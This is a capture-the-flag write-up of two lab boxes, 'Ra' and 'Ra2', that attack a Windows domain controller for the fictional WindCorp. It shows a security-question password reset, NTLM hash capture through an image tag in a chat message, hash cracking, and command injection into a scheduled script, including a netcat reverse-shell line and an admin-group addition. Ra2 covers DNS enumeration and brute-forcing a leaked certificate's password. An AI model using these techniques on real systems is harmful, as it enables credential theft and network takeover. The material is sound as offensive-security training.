# RA
          ___           ___     
         /\  \         /\  \    
        /::\  \       /::\  \   
       /:/\:\  \     /:/\:\  \  
      /::\~\:\  \   /::\~\:\  \ 
     /:/\:\ \:\__\ /:/\:\ \:\__\
     \/_|::\/:/  / \/__\:\/:/  /
        |:|::/  /       \::/  / 
        |:|\/__/        /:/  /  
        |:|  |         /:/  /   
         \|__|         \/__/    


 
You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?

## Services discovery

    rustscan -a 10.10.223.246 -b 900
    ...
    PORT      STATE SERVICE          REASON
    53/tcp    open  domain           syn-ack ttl 127
    80/tcp    open  http             syn-ack ttl 127
    88/tcp    open  kerberos-sec     syn-ack ttl 127
    135/tcp   open  msrpc            syn-ack ttl 127
    139/tcp   open  netbios-ssn      syn-ack ttl 127
    389/tcp   open  ldap             syn-ack ttl 127
    445/tcp   open  microsoft-ds     syn-ack ttl 127
    464/tcp   open  kpasswd5         syn-ack ttl 127
    593/tcp   open  http-rpc-epmap   syn-ack ttl 127
    636/tcp   open  ldapssl          syn-ack ttl 127
    2179/tcp  open  vmrdp            syn-ack ttl 127
    3268/tcp  open  globalcatLDAP    syn-ack ttl 127
    3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
    3389/tcp  open  ms-wbt-server    syn-ack ttl 127
    5222/tcp  open  xmpp-client      syn-ack ttl 127
    5223/tcp  open  hpvirtgrp        syn-ack ttl 127
    5229/tcp  open  jaxflow          syn-ack ttl 127
    5985/tcp  open  wsman            syn-ack ttl 127
    7443/tcp  open  oracleas-https   syn-ack ttl 127
    7777/tcp  open  cbt              syn-ack ttl 127
    9090/tcp  open  zeus-admin       syn-ack ttl 127
    9091/tcp  open  xmltec-xmlmail   syn-ack ttl 127
    9389/tcp  open  adws             syn-ack ttl 127
    49668/tcp open  unknown          syn-ack ttl 127
    49672/tcp open  unknown          syn-ack ttl 127
    49673/tcp open  unknown          syn-ack ttl 127
    49674/tcp open  unknown          syn-ack ttl 127
    49693/tcp open  unknown          syn-ack ttl 127

We got quite a lot of services. Let's start to fingerprint main services:

    nmap -sVC -p 53,80,135,139,445,3389,5222 10.10.223.246 -Pn
    ...
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Windcorp.
    |_http-server-header: Microsoft-IIS/10.0
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2024-06-27T12:13:24+00:00; +1s from scanner time.
    | rdp-ntlm-info: 
    |   Target_Name: WINDCORP
    |   NetBIOS_Domain_Name: WINDCORP
    |   NetBIOS_Computer_Name: FIRE
    |   DNS_Domain_Name: windcorp.thm
    |   DNS_Computer_Name: Fire.windcorp.thm
    |   DNS_Tree_Name: windcorp.thm
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-06-27T12:12:44+00:00
    | ssl-cert: Subject: commonName=Fire.windcorp.thm
    | Not valid before: 2024-06-26T11:54:52
    |_Not valid after:  2024-12-26T11:54:52
    
    5222/tcp open  jabber
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
    | Not valid before: 2020-05-01T08:39:00
    |_Not valid after:  2025-04-30T08:39:00
    |_ssl-date: 2024-06-27T12:34:18+00:00; +2s from scanner time.
    | fingerprint-strings: 
    |   RPCCheck: 
    |_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
    | xmpp-info: 
    |   STARTTLS Failed
    |   info: 
    |     unknown: 
    |     errors: 
    |       invalid-namespace
    |       (timeout)
    |     capabilities: 
    |     auth_mechanisms: 
    |     compression_methods: 
    |     features: 
    |     stream_id: 289u5utxdb
    |     xmpp: 
    |_    version: 1.0
    ...
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2024-06-27T12:12:45
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required

We can notice that SMB is version 3 and that signing is also required, it implies that NTLM realy attack are not possible. We also find the FQDN for the server (fire.windcorp.thm).
First we can inspect the web site, since some images are not loaded correctly due to the fact that the hostname cannot be resolved, let's add the entry to the file host.
Navigating the site we can see that the IM client used is [Spark](https://www.igniterealtime.org/projects/spark). Using searchspolit to find some exploits but I found nothing, but searching the web I hit the following vulnerability: [CVE-2020-12772](https://nvd.nist.gov/vuln/detail/CVE-2020-12772), that actually it was discovered during the creation of this box by the authors. The version affected is 2.8.3 (and the ROAR plugin for it) on Windows. Anyway we need a valid user account to try to exploi this vulnerability, so at the moment is unusable. Going on with discovery actvities I tested the search function that actually does nothing, since the form does not perform any action. Indeed the change password form return the following response. Inspecting the workflow in Burp:

    -->
    POST /check.asp HTTP/1.1
    ...
    username=admin&question=1&secret=Rossi

    <--
    HTTP/1.1 200 OK
    ...
    <h1 class='display-4'>Wrong username and/or secret!</h1>
    ...

Interesting enough if we change the request method we got the same response:

    GET /check.asp?username=admin&question=1&secret=Rossi HTTP/1.1
    ...
Tried the request without passing any parameters, but I got the same response again.
Then I proceeded to fuzz the web application in order to find other resources

    gobuster dir -u http://fire.windcorp.thm -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt
    ...
    Starting gobuster in directory enumeration mode
    ===============================================================
    /check.asp            (Status: 200) [Size: 971]
    /??? Admin_list.asp   (Status: 400) [Size: 311]
    /??? Vote_List.asp    (Status: 400) [Size: 311]
    /Reset.asp            (Status: 200) [Size: 1598]

Even directory bruteforcing does not return any interesting results. Then I decided to check if there are any shares that we can access as anonymous:

    smbmap -H 10.10.223.246                                   
But does not return anything. At this point we have to work around the reset password functionality to get a foothold on the server. Since one of the question is to reset the password is 

    What is/was your favorite pets name?

On the site home page there is the picture of Lily Levesque with a dog, inspecting the image we got:

    <img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">

## Compromise account
So we can try to send use lily as username and sparky as pets name, but again we got: 
Wrong username and/or secret! Let's try with lilyle as username. Again it didn't work, then I tried with lilyle\Sparky. This time the password was reset to a new value, returned in the response.
<!-- lilyle\ChangeMe#1234 -->
Now having these credentials I tried to access the shared folders (NOTE: the server IP address is changed from now on):

    smbmap -u lilyle -p 'XXXXXX#nnnn' -H 10.10.9.146 
    ....
    [+] IP: 10.10.9.146:445 Name: fire.windcorp.thm         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

I started to list the content of the Shared folder:

    smbclient '\\10.10.9.146\shared' -U lilyle --password XXXXXX#nnnn  -t 120
    ...
    smb: \> ls
      .                                   D        0  Sat May 30 02:45:42 2020
      ..                                  D        0  Sat May 30 02:45:42 2020
      Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
      spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
      spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
      spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
      spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020

Here we can get the vulnerable client to install into the attacker machine to try to exploit CVE-2020-12772, that seems the way to get access to the machine.  

## Install Spark client with wine
Since the client is an old application, I got some problems to run it on my attacker machine (kali 2024.2). The more convinient way I found was to install it using wine32. Since we are going to install a bunch of packages that probably you want use anymore once completed the lab, if your attacker machine is a VM,  I suggest to take a snapshot before to install the whole stuff, to revert it once completed the lab. Anyway at the end of the section you will find the instructions to remove wine completely.
Let's proceed to install wine and the support for 32bit arch, since the client app is 32bit application

     sudo apt install wine 
     sudo dpkg --add-architecture i386
     sudo apt update
     sudo apt install wine32

Now we can proceed to downlod the exe from the shared (it takes a while, remember to add the -t option to specify the timeout):

    smbclient '//10.10.9.146/shared' -U lilyle@windcorp.thm -t 120
    ...
    smb: \> get spark_2_8_3.exe
    getting file \spark_2_8_3.exe of size 78765568 as spark_2_8_3.exe (2015.3 KiloBytes/sec) (average 2015.3 KiloBytes/sec)

Then proceed to install the application and executed. Once the client is started you have to set up the following parameters to connect to the server:

    wine spark_2_8_3.exe 
    ...
    Preparing JRE ...
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

In the setup windows click next four times. Once the setup is finished the login window will appear (wait 10 seconds or more, ignore the error: 0144:err:ole:CoUninitialize Mismatched CoUninitialize). Here we have to configure some parameters to connect to the server in the Advanced connection preferences (click the button in the center bottom of the login window):
- Uncheck the automatic discover host and port
- In the connection box set the host to the IP server of the lab
- Leave the default port
- Select accept all the certificates
- Select Disable certificate hostname verification
Click Ok to come back to the credential login input. Here insert lilyle credentials and windcorp.thm as domain and click Login.

## Get a shell on the system
Once logged in, checking the web site home page, it seems that the only online user is <b>buse</b>, so we have to send our payload to him. In the Lyle user window, in the bottom, search for buse. In the results windows double click to the name to open the chat. Before to send our payload let's start Responder:

    sudo responder -I tun0
    ...
    [+] Listening for events...                                                                                                                                                                                                              
Now in the chat windows send the following payload to buse

    Have a look at me at the beach with my new bikini
    <img src="http://10.9.1.97/lily_on_the_beach.jpg">


After a while we will get buse's hash:

    [HTTP] NTLMv2 Client   : 10.10.9.146
    [HTTP] NTLMv2 Username : WINDCORP\buse
    [HTTP] NTLMv2 Hash     : buse::WINDCORP:ab702f1448174896:312957EE0E14C19E1AC7C13952DD48ED:........0000000                                                          [*] Skipping previously captured hash for WINDCORP\buse

Then we can try to reverse the hashed value:

    sudo hashcat -m 5600 -a 0 buse_hash  /usr/share/wordlists/rockyou.txt
    ...
    BUSE::WINDCORP:ab702f1448174896:312957ee0e14c19e1ac7c13952dd48ed:0101000000000000975ac41db2cbda019ecbdaf1a4988ec70000000002000800550039004b00480001001e00570049004e002d00330043005a0042004400440045004c00510048005a0004001400550039004b0048002e004c004f00430041004c0003003400570049004e002d00330043005a0042004400440045004c00510048005a002e00550039004b0048002e004c004f00430041004c0005001400550039004b0048002e004c004f00430041004c00080030003000000000000000010000000020000016f228859c52c2f32d06d45262dc1d34230fca797c76e1510cf119ebcb67d8950a00100000000000000000000000000000000000090000000000000000000000:xxxxxxx
                                                          
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 5600 (NetNTLMv2)

<!-- buse\uzunLM+3131 -->
  
With the newly discovered credentials I tried to login through RDP, but the user has not be granted to the permissions to access the server. Since winrm service is available (5985)

    nmap -p 5985 -Pn -sVC 10.10.9.146
    PORT     STATE SERVICE VERSION
    5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0

We can try to use this service:

    evil-winrm -i 10.10.9.146 -u buse               
    Enter Password:                                       
    Evil-WinRM shell v3.5
    ...
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\buse\Documents> 

## Privilege escalation
I executed the usual command to verify users permissions:

    *Evil-WinRM* PS C:\Users\buse\desktop> whoami /all

    USER INFORMATION
    ----------------
    
    User Name     SID
    ============= ============================================
    windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
    
    
    GROUP INFORMATION
    -----------------
    
    Group Name                                  Type             SID                                          Attributes
    =========================================== ================ ============================================ ==================================================
    Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
    WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
    
    
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
    
    
    USER CLAIMS INFORMATION
    -----------------------
    User claims unknown.
    
    Kerberos support for Dynamic Access Control on this device has been disabled.

 Here an interesting privileges emerged:

         BUILTIN\Account Operators

Since our current user is a member of this security group we can modify other user accounts. More information can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators).
Further I proceed to fingerprint the server:

    Get-ComputerInfo
    WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
    WindowsCurrentVersion                                   : 6.3
    WindowsEditionId                                        : ServerStandard
    WindowsInstallationType                                 : Server
    WindowsInstallDateFromRegistry                          : 4/30/2020 2:35:29 PM
    WindowsProductId                                        : 00429-70000-00000-AA211
    WindowsProductName                                      : Windows Server 2019 Standard
    WindowsRegisteredOrganization                           :
    WindowsRegisteredOwner                                  : Windows User
    WindowsSystemRoot                                       : C:\Windows
    WindowsVersion                                          : 1809
    ...

Testing AMSI it seems not enabled:

    *Evil-WinRM* PS C:\Users\buse\desktop> "invoke-mimikatz"
    invoke-mimikatz

But since we are using remote powershell, we cannot execute most of the commands to check paths to privilege escalation, e.g.

    Get-ScheduledTask
    Cannot connect to CIM server. Access denied 
    
 Since CIM session only works for members of the built in administrators group remotely.
 After a while looking around I found an interesting folder, C:\scripts:

     C:\scripts> dir
    Directory: C:\scripts

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----         5/3/2020   5:53 AM           4119 checkservers.ps1
    -a----         7/1/2024   7:42 AM             31 log.txt

Inspecting the log file:

    type log.txt
    Last run: 07/01/2024 07:52:21
    *Evil-WinRM* PS C:\scripts> type log.txt
    Last run: 07/01/2024 07:53:14

We can see that the file runs every minute. Inspecting the source of checkservers, we notice that for each line in file C:\Users\brittanycr\hosts.txt the Test-connection cmdlet is executed against the retrived value from the file (if the row is not a comment):

    get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
    ForEach-Object {
        $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
        Invoke-Expression $p

Hoping that the task is scheduled to run as system (indeed a very bad configuration) and since we could change the password for other users, as we are members of BUILTIN\Account Operators group. First we can proceed to change brittanycr password:

       *Evil-WinRM* PS C:\scripts> net user brittanycr Pwd12345 /domain
        The command completed successfully.
At this point I thought to use Evil-WinRM again to login as brittanycr, but eventually I got this error:

    Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

At this point I tried to access the Users shared folder as brittanycr (note that the server IP is changed again):

    smbclient '\\10.10.119.17\users' -U brittanycr --password Pwd12345 -t 120
    smb: \> cd brittanycr
    smb: \brittanycr\> ls
     ..
    hosts.txt                           A       22  Sun May  3 15:44:57 2020
    smb: \brittanycr\> get hosts.txt 
    getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

Inspecting the file content:

    cat hosts.txt           
    google.com
    cisco.com
At this point we can chain a malicious command to get a shell. My idea was to upload netcat on the server and execute a reverse shell. So first I uploaded netcat to the server:

    mb: \brittanycr\> put nc64.exe
    putting file nc64.exe as \brittanycr\nc64.exe (105.6 kb/s) (average 105.6 kb/s)

Then I modified the hosts file as follows:

    google.com; C:\Users\brittanycr\nc64.exe 10.9.1.97 1234 -e cmd 

So I expected that the script will execute the following:

    $p = "Test-Connection -ComputerName google-com; C:\Users\brittanycr\nc64.exe 10.9.1.97 1234 -e cmd -Count 1 -ea silentlycontinue"

And I uploaded the modified version of the file

    smb: \brittanycr\> put hosts.txt 
    putting file hosts.txt as \brittanycr\hosts.txt (0.2 kb/s) (average 56.4 kb/s)
    smb: \brittanycr\> ls
      .                                   D        0  Tue Jul  2 09:22:16 2024
      ..                                  D        0  Tue Jul  2 09:22:16 2024
      hosts.txt                           A       72  Tue Jul  2 09:29:24 2024
      nc64.exe                            A    43696  Tue Jul  2 09:22:16 2024

I started a netcat listener on my attacker machine but I never get a shell back, actually I dont' know why. At this point, as suggested in other write-up I tried to add a user to the local administrators group. I modified the hosts file as follows (leave an empty space at the end of the string):

    google.com; net localgroup Administrators buse /add  

Then I uploaded the file, wait a minute and get a shell again using buse user:

    evil-winrm -i 10.10.169.134 -u buse -p xxxxxxx+nnnn
    ...
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\buse\Documents> whoami /groups
    ...
    Group Name                                 Type             SID                                          Attributes
    ========================================== ================ ============================================ ===============================================================
    Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
    BUILTIN\Administrators                     Alias            S-1-5-32-544              
    ...

So being administrator we can get the last flag in C:\users\administrator\desktop.

## Remove wine and i386 architecture
Kill all the process related to Spark client

Remove wine

    sudo apt remove --purge wine32
    sudo apt remove --purge wine
    sudo apt autoremove           


# RA2
     ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
    ▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌
    ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌          ▐░▌
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ ▄▄▄▄▄▄▄▄▄█░▌
    ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░░░░░░░░░░░▌
    ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
    ▐░▌      ▐░▌ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ 
    ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
     ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                       
## Intro
This box is to impersonation and for me was particulary challenge since involves DNS misconfiguration, a vulnerability that I have never exploited before.

## Services discover

    rustscan -b 900 -a 10.10.82.233   
    ...
    ORT      STATE SERVICE          REASON
    53/tcp    open  domain           syn-ack
    80/tcp    open  http             syn-ack
    88/tcp    open  kerberos-sec     syn-ack
    135/tcp   open  msrpc            syn-ack
    139/tcp   open  netbios-ssn      syn-ack
    389/tcp   open  ldap             syn-ack
    443/tcp   open  https            syn-ack
    445/tcp   open  microsoft-ds     syn-ack
    464/tcp   open  kpasswd5         syn-ack
    593/tcp   open  http-rpc-epmap   syn-ack
    636/tcp   open  ldapssl          syn-ack
    2179/tcp  open  vmrdp            syn-ack
    3268/tcp  open  globalcatLDAP    syn-ack
    3269/tcp  open  globalcatLDAPssl syn-ack
    3389/tcp  open  ms-wbt-server    syn-ack
    5222/tcp  open  xmpp-client      syn-ack
    5223/tcp  open  hpvirtgrp        syn-ack
    5229/tcp  open  jaxflow          syn-ack
    5262/tcp  open  unknown          syn-ack
    5263/tcp  open  unknown          syn-ack
    5269/tcp  open  xmpp-server      syn-ack
    5270/tcp  open  xmp              syn-ack
    5275/tcp  open  unknown          syn-ack
    5276/tcp  open  unknown          syn-ack
    7070/tcp  open  realserver       syn-ack
    7443/tcp  open  oracleas-https   syn-ack
    7777/tcp  open  cbt              syn-ack
    9090/tcp  open  zeus-admin       syn-ack
    9091/tcp  open  xmltec-xmlmail   syn-ack
    9389/tcp  open  adws             syn-ack
    49666/tcp open  unknown          syn-ack
    49668/tcp open  unknown          syn-ack
    49669/tcp open  unknown          syn-ack
    49670/tcp open  unknown          syn-ack
    49671/tcp open  unknown          syn-ack
    49691/tcp open  unknown          syn-ack
    49705/tcp open  unknown          syn-ack

Even for this box we got a bunch of services, as previously done for Ra, let's start with the most rilevant:

    sudo nmap -p 53,80,88,135,139,389,443,445,464,636,3389 -Pn -sVC 10.10.82.233 -v

Among the returned information, we found some virtual host that we can proceed to add to our hosts file:

    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Did not follow redirect to https://fire.windcorp.thm/
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-02 14:01:30Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
    |_ssl-date: 2024-07-02T14:02:17+00:00; +3s from scanner time.
    | ssl-cert: Subject: commonName=fire.windcorp.thm
    | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
    ...
    
<b>10.10.82.233 fire.windcorp.thm selfservice.windcorp.thm selfservice.dev.windcorp.thm</b>

Let's visit the selfservices hosts

    https://selfservice.windcorp.thm/

The resource is protected by basic authentication. Indeed

    https://selfservice.dev.windcorp.thm/

results to be under costruction. 

## DNS recon
Then I proceeded to perforn DNS enumeration:

    dnsrecon -n 10.10.82.233 -d windcorp.thm
    [*] std: Performing General Enumeration against: windcorp.thm...
    [-] DNSSEC is not configured for windcorp.thm
    [*]      SOA fire.windcorp.thm 192.168.112.1
    [*]      SOA fire.windcorp.thm 10.10.82.233
    [*]      NS fire.windcorp.thm 192.168.112.1
    [*]      NS fire.windcorp.thm 10.10.82.233
    [*]      A windcorp.thm 10.10.82.233
    [*]      TXT windcorp.thm THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}
    [*] Enumerating SRV Records
    [+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 10.10.82.233 389
    [+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 389
    [+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
    [+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 10.10.82.233 88
    [+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 10.10.82.233 3268
    [+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
    [+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
    [+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 10.10.82.233 88
    [+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.10.82.233 389
    [+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
    [+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 10.10.82.233 389
    [+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
    [+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 192.168.112.1 389
    [+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 10.10.82.233 389
    [+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
    [+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 10.10.82.233 3268
    [+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 88
    [+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.10.82.233 88
    [+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 10.10.82.233 464
    [+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
    [+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
    [+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 10.10.82.233 464
    [+] 22 Records Found

Here we got an hint as the first flag, that suggest us that probably the DNS server allows nonsecure dynamic updates. This in an important information, since we can redirect, through IP resolution, visitors to our attacker machine. In this scenario, since http request are redirected to https, we need another important object in order to perform DNS spoofing: the windcorp.thm certificate private key.

## Find the key
Then I proceeded to directory brute-forcing to find other resources:

    gobuster dir -u https://selfservice.dev.windcorp.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -k
    ....
    /backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/backup/]
    /Backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/Backup/]
    /*checkout*           (Status: 400) [Size: 3420]
    ...

    gobuster dir -u https://fire.windcorp.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -k
          ....
          /img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/img/]
          /css                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/css/]
          /vendor               (Status: 301) [Size: 156] [--> https://fire.windcorp.thm/vendor/]
          /IMG                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/IMG/]
          /*checkout*           (Status: 400) [Size: 3420]
          /CSS                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/CSS/]
          /Img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/Img/]
          /*docroot*            (Status: 400) [Size: 3420]
          ...
          /powershell           (Status: 302) [Size: 165] [--> /powershell/default.aspx?ReturnUrl=%2fpowershell]
          ...
So Windows PowerShell Web Access is configured on fire.windcorp.thm. This tool will come in handy later.


Visiting the backup URI we can see:

    selfservice.dev.windcorp.thm - /backup/
    ...  
    5/28/2020  8:41 PM         2827 cert.pfx
    5/28/2020  8:45 PM          168 web.config

Lucky enough, we found a certificate bundle file. Once downloaded the file I proceeded to brute-force the certificate password as follows

    cat /usr/share/wordlists/rockyou.txt|
    while read p; do
        echo $p
        openssl pkcs12 -in cert.pfx -nodes -passin "pass:$p";
        RC=$?; if [ $RC -eq 0 ]; then
    break; fi ; done
Once a valid password is found the procedure will stop and will output the private key and the certificate:

          ...
          Mac verify error: invalid password?
          <here certificate password>
          Bag Attributes
              Microsoft Local Key set: <No Values>
              localKeyID: 01 00 00 00 
              friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
              Microsoft CSP Name: Microsoft Software Key Storage Provider
          Key Attributes
              X509v3 Key Usage: 90 
          -----BEGIN PRIVATE KEY-----
          MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
          ...
          y+tQYYpi8HTqt2yzZ01n6C+0
          -----END PRIVATE KEY-----
          Bag Attributes
              localKeyID: 01 00 00 00 
          subject=CN=fire.windcorp.thm
          issuer=CN=fire.windcorp.thm
          -----BEGIN CERTIFICATE-----
          MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
         ...
          MTUqFyYKchFUeYlgf7k=
          -----END CERTIFICATE-----

Copy the key file section, starting from <i>Bag Attributes</i> until <i>-----END PRIVATE KEY-----</i> and save it in a file:

          cat fire.windcorp.thm.key
          Bag Attributes
            ..
          -----BEGIN PRIVATE KEY-----
          MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
          ...
          y+tQYYpi8HTqt2yzZ01n6C+0
          -----END PRIVATE KEY-----

Save the remaning part of the output in another crt file:

          cat fire.windcorp.thm.crt 
          Bag Attributes
             ...
          -----BEGIN CERTIFICATE-----
          MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
          ...
          MTUqFyYKchFUeYlgf7k=
          -----END CERTIFICATE-----

We will use those files later to config https in Responder.
<!-- ganteng -->
Using this [tool](https://github.com/nomailme/certificate-info) we can see certificate information:

          Version]
            V3
          
          [Subject]
            CN=fire.windcorp.thm
            Simple Name: fire.windcorp.thm
            DNS Name: fire.windcorp.thm
          
          [Issuer]
            CN=fire.windcorp.thm
            Simple Name: fire.windcorp.thm
            DNS Name: fire.windcorp.thm
          
          [Serial Number]
            508D90BD74C28FB44255DBFA5E518CBE
          
          [Not Before]
            5/29/2020 5:31:08AM
          
          [Not After]
            5/29/2028 5:41:03AM

          ...
          * X509v3 Subject Alternative Name(2.5.29.17):
            DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm

